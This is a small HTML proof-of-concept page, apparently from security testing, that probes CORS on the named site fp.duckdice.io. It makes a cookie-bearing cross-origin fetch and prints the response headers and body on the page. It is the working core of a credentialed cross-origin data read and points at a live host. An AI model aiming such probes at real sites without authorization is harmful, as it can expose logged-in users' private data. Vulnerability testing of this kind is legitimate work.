<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>CORS PoC</title>
</head>
<body>
  <h1>Testing CORS on fp.duckdice.io</h1>
  <pre id="output">Waiting...</pre>

  <script>
    const out = document.getElementById("output");

    fetch("https://fp.duckdice.io/", {
      credentials: "include"   // يرسل الكوكيز
    })
    .then(response => {
      out.textContent = "✅ Got response\n";
      out.textContent += "Status: " + response.status + "\n";
      out.textContent += "Headers:\n";
      for (const [k,v] of response.headers.entries()) {
        out.textContent += k + ": " + v + "\n";
      }
      return response.text();
    })
    .then(data => {
      out.textContent += "\nBody:\n" + (data.trim() || "[empty body]");
    })
    .catch(error => {
      out.textContent = "❌ Error:\n" + error;
    });
  </script>
</body>
</html>
